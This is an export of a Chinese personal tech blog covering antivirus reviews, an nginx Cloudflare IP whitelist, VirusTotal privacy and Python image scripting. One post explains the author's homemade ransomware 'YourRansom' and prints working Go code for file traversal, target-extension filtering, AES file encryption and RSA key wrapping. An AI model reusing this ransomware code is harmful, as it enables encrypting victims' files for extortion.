{"pages":[{"title":"关于我","date":"2018-05-21T08:04:23.590Z","path":"about/index.html","text":"你们怎么写关于页写那么多的，我感觉一个字都写不出来。。。 嘛，要友链的话请留言就好。"},{"title":"Categories","date":"2018-05-21T08:04:23.593Z","path":"categories/index.html","text":""},{"title":"Tags","date":"2018-05-21T08:04:23.597Z","path":"tags/index.html","text":""}],"posts":[{"title":"记一次对于 Py 图像库的蛋疼应用","date":"2018-05-21T08:04:23.581Z","path":"post/py-pic/","text":"起因 想帮同学批量生成个门票图片，便于打印（他们竟然在用 Acrobat 编辑 pdf 然后打印，当然去年他们竟然用 PS 编辑，相对来讲倒是好多了。。。） 折腾路上 - 预处理 我第一反应当然是用 Py 来做这种东西，毕竟轮子比较多。 票务上的同学给了我一个坑爹的 xls，数据格式类似（括号内为栗子）： 座区（QWQ）| 票号（2333）| 座位信息（QWQ/01/01）。 果断上 Navicat 大法导入一个 sqlite 文件，提取的时候直接用 SQL 语句即可。 大坑一 - 图像处理 然后就是图像库这一最重要轮子的问题了，我所知的 py 图像库有 PIL（Pillow）和 Wand，看不少人都挺推崇 PIL 的，果断上之，而且 < a href=\"http://pillow.readthedocs.io/en/latest/\" target=\"_blank\" rel=\"noopener\">Pillow 的文档 也相当的全，是一个品质之选。 但是我最后还是选择了 Wand，这是因为在一篇文章中看到有人说似乎 Pillow 的 font_size 无法正常使用。我在开发的时候用 pdf 中的字号填了上去，发现字很小，于是听信之。（事实证明并没有这回事 然而在换成 Wand 之后，用同样的字号值依旧如此，，，坑了 附：测试时所用代码 < br>Pillow（参考自 < a href=\"http://pillow.readthedocs.io/en/latest/reference/ImageDraw.html\" target=\"_blank\" rel=\"noopener\">Pillow 的 doc）：1234567891011from PIL import Image, ImageDrawbase = Image.open(&apos;4.jpg&apos;)txt = Image.new(&apos;RGBA&apos;, base.size, (255,255,255,0))fnt = ImageFont.truetype(&apos;./Calibri_Light.ttf&apos;, 48.0)d = ImageDraw.Draw(txt)d.text((10,10), &apos;WTF&apos;, font=fnt, fill=(255,255,255,255))out = Image.alpha_composite(base, txt)out.show() Wand（参考 < a href=\"http://docs.wand-py.org/en/0.4.2/guide/drawing.html\" target=\"_blank\" rel=\"noopener\">Wand 的 doc-Drawing）：1234567891011121314from wand.image import Imagefrom wand.display import displayfrom wand.drawing import Drawingfrom wand.color import Colorfrom wand.font import Fontimg = Image(filename=&apos;4.jpg&apos;)with Drawing() as draw: draw.font = &apos;./Calibri_Light.ttf&apos; draw.font_size = 48.0 draw.fill_color = Color(&apos;White&apos;) draw.text(10, 10, &apos;WTF&apos;) draw(img)img.save(&apos;text.jpg&apos;) 后来啊，我发现。。。调大字号字确实能变大，只不过从 pdf 中找出来的字号大小不合用。。。（喷水. jpg 而且因为已经把基于 PIL 的代码重写成了基于 Wand 的代码，干脆就这样用下去吧。 大坑二 - Acrobat 导出图片分辨率 本来在用一张测试的时候一切都好好地，但当我开始试图用多张模板进行工作时（他们给了我五个版），坑就来了。每一张图上的字竟然不一样大，而且字所在位置也不同。仔细查看之，发现各图分辨率也是不同，心有所感，打开 Acrobat，细细检查导出选项，赫然见一 “分辨率：自动选择”（这 tm 坑爹呢） 于是挨张重新生成之。 最终结果 坑已填好了，bobo 就用实际代码说话了： 模块（tkimg.py）： 12345678910111213141516171819202122232425262728293031323334# -*- coding: utf-8 -*-from wand.image import Imagefrom wand.display import displayfrom wand.drawing import Drawingfrom wand.color import Colorfrom wand.font import Fontdef maketk(picname, areainfo, face): img = Image(filename=picname) if face == &apos;front&apos;: for i in (0,1,2): plus = i * 2350 with Drawing() as draw: draw.font = &apos;./Calibri_Light.ttf&apos; draw.font_size = 288.0 draw.fill_color = Color(&apos;White&apos;) draw.text(160, 2115+plus, areainfo[i][0]) draw.text(1859, 2115+plus, areainfo[i][1]) draw.text(2698, 2115+plus, areainfo[i][2]) draw.text(3518, 2115+plus, areainfo[i][3]) draw.draw(img) elif face == &apos;back&apos;: for i in (0,1,2): plus = i * 2350 with Drawing() as draw: draw.font = &apos;./Calibri_Light.ttf&apos; draw.font_size = 160.0 draw.fill_color = Color(&apos;White&apos;) draw.text(4349, 2180+plus, areainfo[i][4]) draw.draw(img) imgname = &quot;%s-%s%s%s-%s%s%s.jpg&quot; % (face, areainfo[0][0], areainfo[0][2], areainfo[0][3], areainfo[2][0], areainfo[2][2], areainfo[2][3]) img.save(filename=imgname) 数据处理（app.py）： 太懒略之，回头有空再翻出来补。 May 11, 2016","tags":[],"categories":[{"name":"手记","slug":"手记","permalink":"https://bobo.moe/categories/手记/"}]},{"title":"念念不忘，未见回响。-- 悼 BD","date":"2018-05-20T16:00:00.000Z","path":"post/miss-bd/","text":"沉寂许久，今日此文不为何事，只是悼念心中最强的 BD。 开始 作为一个从 15 年开始用 BD 的用户，我开始成为 BD 用户的时间几乎是 BD 的巅峰时代的中间：AVC 主防模块强大至极，入库迅速且准确，启发亦毫不逊色不输 eset 之流，可以说除了更新的网络问题之外很难说有什么问题了。这一切直接导致我成为了一名 BD 的脑残粉。 BD 的势力前所未有地强大：Emsi、FS、Bullguard、360、腾管。似乎全世界的杀软都在 OEM BD，我们用 BD 库是否更新及时来衡量一款杀软是否值得一用，比如腾管国际版。 那时的 BD 从没有让我失望过，除了 bug。 路上 曾经我在卡饭的 BD 版发了一个帖子，总结了一些小指南给新人，一条回复曾被我忽略，但如今看去颇有感慨。 他说（ @流水寒丶 ）：1官方都不重视， 民间高手联系官方得到的态度都是不冷不热，谁受的鸟。 其实在 16 年，BD 就已经让用户颇为寒心，无论中文的问题，坚持误报 TGP，还是 bug 出现率远远高于其他杀软，完全无视用户的建议。 我们把 BD 的报毒名戏称为乱码，我们似乎没有想到，这让 BD 病毒分析人员的权限无限放大，他们连分类都不需要，更无需担心任何诸如红伞的简单报告库一般的「琐事」，只是冰冷地按下 Y or N。 只是我们都未很在意，只是说着 < code > 这就是 BD，不爽不要玩。 至少我错了，我想。 升调 终于，这个强大到只手遮住了杀软界半边天的巨头露出了他” 高昂”的内心，BD2018，相信是大部分 BD 玩家的噩梦，发布了。 起初，卡饭 BD 版区的人们在欢呼： 新版真好看！ATC 升级了，入库就是正义，主防就是真理！。很快，当 BD2018 干掉了我的 explorer.exe 之后，我就笑不出来了。 我发现了 BD 不再兼容 mactype，并因此干掉我电脑上几乎所有 exe，我卸载了 BD，我不能没有 mactype。 我很庆幸我在此时离开了 BD，这至少保住了它在我心中的形象。 固执 离开 BD 后，我开始患上「杀软综合征」，装了又卸，换个不停。终于有一天我想起来重回 BD，带着希望而来。 失望而归。 BD 没有解决任何一个问题，神秘地安装停滞、无法启动甚至是卸载都出错。我的 exe 们又被「三光」了个遍。 我真的很 naive。 疯狂 至今，ATD 仍然是那副疯狂的样子，论坛依然民不聊生。而让我写下这些文字的诱因是 BD 的另一个长处：入库狂魔。 可能关注样本区的朋友们有看到我最近发了一条误报，本来主流中只有 ESET 报个壳而已。 我还同 @pal 家族 打趣说卡巴不敢报，但是 eset 敢啊，但是一转眼–BD 启发了？！ 我仿佛听到自己的脸在啪啪作响，即使内心仍存着这是误报的希冀，但仍有着隐忧：延迟一天才入库，会不会是拿到样本并且分析了呢？ 我不敢想，我不相信 BD 会如此轻率地将一个正常的软件判为病毒，但是种种迹象告诉我大抵是这样的没错。入库狂魔，真的「狂」了。 即使如此，该 OEM 的还是在 OEM 着，来自 BD 的病毒库疯狂刷新着特征数量，带给用户安全感，高踞在信任的王座上。 这个勇者，也变成恶龙了么？","tags":[],"categories":[{"name":"随感","slug":"随感","permalink":"https://bobo.moe/categories/随感/"}]},{"title":"Welcome to Note of bobo","date":"2018-02-08T16:00:00.000Z","path":"post/index/","text":"Hello, 这里是又双叒 (ruo) 叕(zhuo)一次新建成的作死日志。 此次重建放弃了难用至极的 Wikitten，看起来有一位同学于我有相同的想法，并创作了 该 hexo 主题。 然后我削微的膜改了一下样式，就直接拿来用了：popu125/hexo-theme-Wikitten 在这几年里，我做了很多，写了很多，更删了很多，忘却了很多，剩下的，都是还没来得及忘却的东西。 左侧是目录，还请随意翻看（如果有人会来这个小破网站的话）。 bobo liu 18/02/09","tags":[],"categories":[]},{"title":"正确地使用 Cloudflare 保护你的网站","date":"2017-11-30T16:00:00.000Z","path":"post/cf-true/","text":"今天看到某不愿透露姓名的雨落无声同学在群里提到自己的网站被轮，最后只好上 cf。 有感于 cf 确实是防日的好工具的同时，在这里强调一下很多时候会被（上了 cf 就感觉万事大吉的）小站长们忽略的一个问题：*map 大法。 按照规矩，说问题应该先给 PoC，但这玩法实在太普及，就简单说一下原理： 通过 nmap/zmap 之类的工具，扫描全网（如果能从网页确定网段那自然更棒），然后伪装 host 验证。 这个玩意解决还是很简单的，只要做 ip 过滤就行了，以 nginx 为例： 先准备好 ip 白名单 123456# 下载并处理 cf 的 ipv4 列表，并写入 / etc/nginx/cfv4.conf 文件 wget -O- https://www.cloudflare.com/ips-v4 |\\sed -e \"s/^/allow /\" -e 's/$/;/' &gt; /etc/nginx/cfv4.conf# 如有 v6 可执行，但是现在应该很少有人扫 v6 的就是了 # wget -O- https://www.cloudflare.com/ips-v6 |\\# sed -e \"s/^/allow /\" -e 's/$/;/' &gt; /etc/nginx/cfv6.conf 然后在你的 vhost 配置中加入 1234include cfv4.conf;# 如果有 v6# include cfv6.conf;deny all; 这样基本的安全操作（之一）就完成啦~","tags":[],"categories":[{"name":"经验","slug":"经验","permalink":"https://bobo.moe/categories/经验/"}]},{"title":"Zemana 非官方技术白皮书","date":"2017-11-01T16:00:00.000Z","path":"post/zemana-white-book/","text":"Zemana 并没有提供官方的技术文档共下载（可能是因为根本拿不上台面吧），这里通过它提供的其他文档中透露出的信息，结合实际使用体验，做出对于其使用技术的解析。 Pandora Cloud-Sandbox 这个名字可以说是 Zemana 所有技术中名字最神秘也最令人难以理解的了，关于其本质的分析我曾在卡饭发布，这里再说一遍： 官方产品介绍手册（ZAL） http://dl9.zemana.com/Website_Media/Zemana%20AntiLogger%20brochure.pdf 原文摘录如下： Pandora SandboxEach unknown file will be analyzed carefully in the cloud with PandoraTechnology before they execute on your PC. By using this technology onyour PC, any zero-day malware that wants to attack has no power! 大意总结： 当使用 Pandora 技术时，每一个未知的文件都会在运行前在云端被仔细分析 官网提供的反勒索测试报告 https://www.mrg-effitas.com/wp-content/uploads/2016/07/Zemana_ransomware_detection.pdf 原文摘录如下： Pandora works as a combination of cloud reputation database (blocking previously unknown files), and a cloud sandbox, where suspicious samples are sent to the cloud, and analyzed there. If a sample is detected as malicious, all Zemana users (even where Pandora is turned off) are protected in the future against that specific threat. 大意总结： Pandora 是一个云信誉库和云沙盘的结合，可疑的样本将被发送到云端进行分析。如果样本有害，所有的 Zemana 用户将受到保护。 结论：就是个没啥新意的云，名字起得不错 扫描器的本质 曾有人问我 Zemana 的主防怎么样，我不太确定如何回答，因为它根本没有主防。官方对自己的定位很明确，在语言文件中可以看到： %s is a second opinion cloud-based malware scanner 正如官方所言，无论是 ZAM 还是 ZAL，其本质都是一个“基于云的作为第二选择的病毒扫描器”。 ID Theft Protection 这个原翻译译作 “身份保护”，我称作“信息保护” 的东西，乍一看也很高大上，但实际上也不是什么新东西，就像 Pandora 一样。 根据 ZAL 产品文档的描述，这个组件被分成三个功能部分： Secure SSL Keystroke Logging Protection System Intrusion Protection 前两个都不是很有趣，而最后一个 System Intrusion Protection 则看起来有点意思。在 ZAL 产品文档中，可以看到： The AntiLogger’s System Defense module secures the very heart of your PC in a future proof way: it detects malicious attempts based purely upon their behavior, regardless of whether or not the malware attacking you has been identified, isolated, analyzed and your anti­virus product updated. 其中对于系统防护模块的表述给人有种基于行为判断的主防的感觉，但实际使用过程中并没有让人感觉到明显的行为主防痕迹，目前有待进一步的测试。 剩下的 什么？你还以为会有剩下的？要是还有剩下的内容的话，我想 Zemana 就会自己出白皮书大肆吹嘘了吧。。。","tags":[],"categories":[{"name":"手记","slug":"手记","permalink":"https://bobo.moe/categories/手记/"}]},{"title":"Zemana Endpoint Security (ZES) 简单测评","date":"2017-11-01T16:00:00.000Z","path":"post/zes-test/","text":"嘛，之前就看到了 ZES 出来了，但是一直没有下手。最新心情不佳，于是去忽悠了一下客服，得以入手 ZES 一年试用授权一枚，尽管应该没人会用，但还是试用并且记录一下，要不就浪费了授权了是吧。。。 波折 客服给我发的是个错误的（而且过期很久的）下载链接，我给他发了三封邮件才拿到正确的。（恰逢周末，人家放假也没啥问题对吧。。。） ZES 控制端要求 64 位服务器系统，我的辣鸡电脑要在 VM 里带动这玩意着实有点困难（主要是内存只有 4G，严重不足），而且我还需要一个测试终端用的虚拟机，性能就更不足了，最后只能一卡一卡地搞。。。 正经测试时间 安装主控端 直接双击安装，安装界面省略（懒得截图了），不过看起来（似乎）挺正式的。 最后一步需要下载所有安装包，耗时极长，下载完之后还要加一个扩展名为 < code>.cfg 的配置文件再压缩起来，内容如下： 1234&#123; \"ControlCenterAddress\": \"127.0.0.1:55555\", \"Role\": 1&#125; 就 4 行，但是却食用了我大量的硬盘 IO（20MB/s），花了半个小时。。。令人极度怀疑是不是实现逻辑有问题。 主控 web 管理 跟着客服提供的安装教程走，很快就到了打开浏览器看主控台的步骤，想想还有点小激动（雾），打开浏览器看一下： 界面还是挺简洁的，扁平化做的也不错。这是我安装了终端之后的截图，但还是看不到终端上线，不知是不是我配置有问题。 终端部署 继续跟着教程走，在 web 面板点击下载。咦？怎么卡住了？虚拟机都卡死了？打开任务管理器一看： Emmmmm… 这文件都是现成的，怎么还需要那么大的读写的？这 web 服务器有毒吧？ 终于开始下载了。。。 内网你给我搞出这个速度？这 web 服务器有毒吧？ 终端体验 受不了卡出屎的感觉，直接从 IIS 的目录底下把安装包拖了出来，完美解决问题，安装一切顺利。这企业版的界面不知道比个人版高到哪里去了，Zemana 这么不在意个人用户的么？ 作为一个老玩家，不打开目录仔细看看不就太过浪费了，让我们打开 < code>Signatures 目录看看： 等等，这目录名好像不太对，，，让我打开看看 BD 库： AVC： 夭寿啦，Zemana 也加入 BD 系啦！连 AVC 都买啦！ 小结 本着“作文应当有头有尾” 的原则，姑且写一个小结。 很明显 ZES 做的还是。。。很不错的（良心？不存在的），只是部分（很多）细节还需要进行打磨。 最后，ZAL 画风什么时候能现代化啊，好蛋疼。。。","tags":[],"categories":[{"name":"手记","slug":"手记","permalink":"https://bobo.moe/categories/手记/"}]},{"title":"关于 VirusTotal 隐私的几点讨论","date":"2017-08-09T16:00:00.000Z","path":"post/vt-privacy/","text":"起因 我想在座的各位可能还有不太清楚 VT 的隐私条款的，正好在下也在这上面吃了点小亏，于是谈一谈。 收集数据 如果有人总是在看各大安全媒体的话，应该能注意到之前 VirusTotal 搞出来的诸如“木马作者通过 VT 检测免杀，VT 辅助追踪” 之类的新闻。对此我特意去看了一下 VT 的隐私条例，原文引用如下： Information we collect to provide you with the services includes: Information you submit in connection with using our services. This includes the files, URLs, and other information you submit for scanning, information you provide when you join and participate in the VirusTotal community (such as profile information, comments, mentions, and votes), and any information you provide when contacting VirusTotal. Device information: We may collect device-specific information (such as your hardware model, operating system version, unique device identifiers, and mobile network information including phone number). Log information: When you use our services or view content provided by VirusTotal, we may automatically collect and store certain information in server logs. This may include: details of how you used our service; Internet protocol address; device event information such as crashes, system activity, hardware settings, browser type, standard HTTP request headers, including but not limited to user agent, referral URL, language preference, date and time; and cookies that may uniquely identify your browser or your VirusTotal Account. Payment information: To the extent you purchase any premium services offered by VirusTotal, we may collect or receive your credit card and other payment information. Cookies and Local Storage: We and our partners use various technologies to collect and store information when you visit the website, and this may include sending one or more cookies or randomly generated identifiers to your device. A cookie is a small file containing a string of characters that is sent to your computer when you visit a website. Cookies may store user preferences and other information. We use cookies to remember user preferences, such as language, provide users with customized experiences, based on account type, and to prevent abuse. We also use third-party analytics tools (including Google Analytics) to assist us with analysing and improving our services. The “help” portion of the toolbar on the majority of browsers will direct you on how to prevent your browser from accepting new cookies, how to command the browser to tell you when you receive a new cookie, or how to fully disable cookies. However, some of VirusTotal’s website features or services may not function properly without cookies. We may also collect and store information using mechanisms such as browser web storage (including HTML5) and application data caches. 简单来说就是收集的数据较之百度只多不少，而且百度还有拒绝收集的开关呢，VT 只会说不同意就滚。这样一比是不是突然感觉百度良心了一点？;) 而且毫无疑问你提交的文件会被 VT 所保存，而那些人会拿到你的文件呢？请往下看。 数据使用 We use the information we collect from all of our services to provide, maintain, protect and improve them, to develop new services, and to protect VirusTotal and our users. This includes using the information to: analyse and scan the files and other content you submit; develop new services and service features; create, publish and update the scan reports available on VirusTotal, including comments, mentions and trusted ratings; develop and provide information to the VirusTotal Community; create and administer your account; understand and improve how our users use and interact with VirusTotal services; protect and secure the VirusTotal site and services, including the networks and systems through which we provide the services; and process payments for premium services offered by VirusTotal. 仅看到此的话似乎隐私状况还是很乐观的，但是继续看： Files, URLs, comments and any other content submitted to or shared within VirusTotal may also be included in premium services offered by VirusTotal to the anti-malware and ICT security industry, with the sole aim of improving research and development activities, expecting it to lead to an overall safer internet and greater end-user protection. Participants include a broad range of cybersecurity professionals focused on product, service, and system security and security products and services. 重点是加粗的那一句，简单翻译的话就是 （文件分享的）参与者包括一个大范围的安全专家 所以说，当我发现自己仅上传过 vt 测试的程序被扒下来当样本的时候我的内心毫无疑问是极度崩溃的。。。而回首一翻隐私条例发现，这 tm 还是我同意过的。。。请注意上传框下方的这一段话： By using VirusTotal you consent to our Terms of Service and Privacy Policy and allow us to share your submission with the security community. mmp","tags":[],"categories":[{"name":"手记","slug":"手记","permalink":"https://bobo.moe/categories/手记/"}]},{"title":"自制勒索有感 & 技术简析","date":"2017-01-09T16:00:00.000Z","path":"post/ransom/","text":"嘛自从去年 10 月更过博客之后就啥都没写过了。。。这次正好趁着卫队搞新年活动写点什么。 前段时间在卡饭，勒索病毒是很火的一个讨论话题，而我也跟着一位大神的风写了一个简单的勒索病毒，这里写一点东西，作为纪念。 说起勒索病毒，其实它的行为和技术都很简单（除了某些硬肛硬盘的品种之外，当然我们今天讨论的只有普通的文件加密病毒，像 cerber 那样的） 其主要行为由遍历和加密两部分组成，下面在下使用自己的代码分析一下这两部分的实现（代码较渣还请原谅 首先是遍历，这一部分十分简单，不过还有一个很重要的问题需要注意：不要无脑。先前在下的第一版 YourRansom 就是因为无脑遍历进了系统文件夹还试图加密才被。。。 闲话不多说，先上代码： 123456789101112131415161718192021222324252627282930313233343536373839func do_cAll(path string, cip cipher.Block, action byte) error &#123; // 获取一下路径的信息 dir, serr := os.Stat(path) if serr != nil &#123; return serr &#125; // 判断是否是个目录，如果不是就交给加(解) 密处理 if !dir.IsDir() &#123; if action == 'e' &amp;&amp; !filter(path, action) &#123; return nil &#125; fmt.Println(\"File:\", path) switch action &#123; case 'e': encrypt(path, cip) case 'd': decrypt(path, cip) &#125; &#125; // 既然到这里了那就是个目录了，让我们继续遍历 fmt.Println(\"Path:\", path) // 先打开这个目录 fd, err := os.Open(path) if err != nil &#123; return err &#125; // 获取到目录下前 100 个文件名 names, err1 := fd.Readdirnames(100) if len(names) == 0 || err1 != nil &#123; return nil &#125; // 为每一个文件名迭代一遍自身 for _, name := range names &#123; do_cAll(path+string(os.PathSeparator)+name, cip, action) &#125; return nil&#125; 其中为了防止无脑遍历我上了一个 filter 函数，用于判断传入的目录或文件名是否有关键词，以确认是否可以肛(虽然实现还是很无脑)：1234567891011121314151617181920212223242526func filter(path string, action byte) bool &#123; // 将传入的路径转为全小写，便于判断 lowPath := strings.ToLower(path) // 屏蔽和加密后缀列表 innerList := []string&#123;\"windows\", \"program\", \"appdata\", \"system\"&#125; suffixList := []string&#123;\".txt\", \".zip\", \".rar\", \".7z\", \".doc\", \".docx\", \".ppt\", \".pptx\", \".xls\", \".xlsx\", \".jpg\", \".gif\", \".jpeg\", \".png\", \".mpg\", \".mov\", \".mp4\", \".avi\", \".mp3\"&#125; // 判断路径中是否包含敏感词(大雾) for _, inner := range innerList &#123; if strings.Contains(lowPath, inner) &#123; // 如果存在就返回 false return false &#125; &#125; // 判断路径是否以加密后缀结尾 for _, suffix := range suffixList &#123; if strings.HasSuffix(lowPath, suffix) &#123; // 如果是就返回 true return true &#125; &#125; // 既然到这里了那肯定就是既不包含敏感词，也没有加密后缀名的，还是 false return false&#125; 嗯，这样遍历就实现完成了，接下来是加密这个重头戏。得益于 Golang 内置库的完备，我们可以直接 import 一个 < code>crypto/aes 包来实现 aes 的加解密。 下面是 aes 加密的实现： 123456789101112131415161718192021222324252627282930func encrypt(filename string, cip cipher.Block) error &#123; // 判断该文件是否已加密了 if len(filename) &gt;= 11 &amp;&amp; filename[len(filename)-10:] == \".youransom\" &#123; fmt.Println(\"Warning: A encrypted file found.\") return nil &#125; // 试图打开文件用于写入 f, err := os.OpenFile(filename, os.O_RDWR, 0) fmt.Println(\"Encrypt:\", filename) if err != nil &#123; return err &#125; fstat, _ := f.Stat() size := fstat.Size() // 开始循环加密 buf, out := make([]byte, 16), make([]byte, 16) for offset := int64(0); size-offset &gt; 16 &amp;&amp; offset &lt; 512; offset += 16 &#123; f.ReadAt(buf, offset) cip.Encrypt(out, buf) f.WriteAt(out, offset) &#125; // 关闭文件并添加后缀 f.Close() os.Rename(filename, filename+\".youransom\") return nil&#125; 嗯，在下很贴心地添加了防止二次加密的相关判断用于保护用户的数据安全，多么贴心啊(滑稽 相信有不少兄弟在看到 aes 加密的时候都是一脸蒙蔽状态：这是啥为啥我看不明白。其实不需要在意太多，因为是全黑盒的所以只要用就好了。 不过基础知识还是要知道的，这里在下简单地说一下： AES 是一种对称加密算法，通常我们可以认为在没有密钥的情况下是无法解密 AES 的。而所谓对称加密，可以理解为像通常我们理解的加解密那样，用同一个密钥既能加密，也能解密。 这背后是有比较复杂的数学原理的，喜欢探究而且高数成绩不错的同学可以试试去 wiki 的 aes 页面看一眼。 毫无疑问 AES 的性能是很高的，而通常我们看到的勒索却大都写着使用 RSA 加密，这是一个显而易见的原因的，就是 AES 是对称加密。 我们很难去简单的使用对称加密实现一个 “用户被加密之后不管怎么搞都解不了密只能乖乖交钱” 的场景，无论是发送到服务器，还是保存到本地，都是很危险的。 还记得曾经有一个国产加密使用 AES 还直接把密钥存到本地最后没收到钱还被嘲讽了一番的悲伤故事么？ 而这种场景交由 rsa 实现简直不能再棒了：RSA 是一种非对称加密，它有两个密钥：用其中一个密钥加密的数据只有用另一个密钥才能解密。这就完美地消除了将密钥存储在本地的危险。 下面是在下使用 rsa 加密 aes 密钥的实现： 123456789func saveKey(cip []byte) &#123; keyFile, _ := os.Create(\"YourRansom.key\") block, _ := pem.Decode(pubKey) pubI, _ := x509.ParsePKIXPublicKey(block.Bytes) pub := pubI.(*rsa.PublicKey) word, _ := rsa.EncryptPKCS1v15(rand.Reader, pub, cip) keyFile.WriteAt(word, 0) return&#125; 最后把它们拼在一起，就成为了 YourRansom，一个简单至极的自制勒索。 Github：https://github.com/popu125/YourRansom 17/01/17","tags":[],"categories":[{"name":"手记","slug":"手记","permalink":"https://bobo.moe/categories/手记/"}]},{"title":"博客折腾记 (迁移到 Hugo 和 Gitment)","date":"2016-05-10T16:00:00.000Z","path":"post/move-to-hugo/","text":"自从放弃 Typecho 踏上静态化博客的不归路，我花在折腾上的时间似乎正变得越来越多，刚刚 (一个月之前) 完成了博客从 Hexo 到 Hugo 的迁移，折腾甚多但收获亦丰，希望与朱军共享之(朱军：干我屁事？)。 关于 HugoHugo 与 Hexo 相同，也是一个静态网页生成工具，只不过因为其是 Golang 写成，可以编译为可独立运行的二进制文件，故无论是携带使用还是随时升级都极为方便(虽然我也不会带着用它) 关于评论 之前在下偷懒使用了多说作评论(本来是 disqus 的，但是 disqus 喜欢强行引导用户注册帐号让人很不爽)，结果谁想天有不测风云… 本来就半死不活但似乎还能残喘不少时日的多说突然就嗝屁了，这挺萌的就尴尬了(＃°Д°) 本来打算使用一些成品的自建评论系统或者自己写一个来着，但是正巧在 V 站看到有人做的这个 Gitment，感觉很合适我的风格，于是干脆搞了一份下来，改改自己用。 以及这玩意是不违反 GayHub 的 TOS 的，具体看原 repo 关于删博文 我的天每次看博客都被自己曾经发的各种二笔文章吓尿，于是果断借这次机会把他们都删干净啦 & lt;(￣︶￣)↗ 关于友链 这次的主题是基于超简洁主题 hyde 改得，弄得自己都不知道往哪里放友链来的合适，，，不过一定会想办法放上的。 关于 FirebaseFirebase 是一个安卓的开发者云服务网站，现已加入 Google 豪华午餐。Firebase 在提供各种服♂务的同时提供一个静态文件 hosting，空间比 COS 小，流量比 COS 少，部署比 COS 麻烦(需要翻)，有个 SSL 还是 LE 的，而且还是多域名一起签的。 不过，他家 CDN 是 Fastly 的，可以拿来看着装 13 啊~ 好吧，成功扯远了。总之域名没有备案又不太能忍受 GayHub Pages 的速度的同志可以一试，速度还是不错的。至于我嘛，回头折腾够了应该会搬回 COS 吧。 挖坑 如果可能的话写篇 Hugo 的简单教程(感觉这玩意没啥必要，文档很齐全) YourRansom 作出了很多更新，重新写一篇源码分析，以及继续修改不优雅的代码 写一个 YourRansom 一键生成工具(我这是在找死吧。。。) 17/06/08","tags":[],"categories":[{"name":"手记","slug":"手记","permalink":"https://bobo.moe/categories/手记/"}]}]}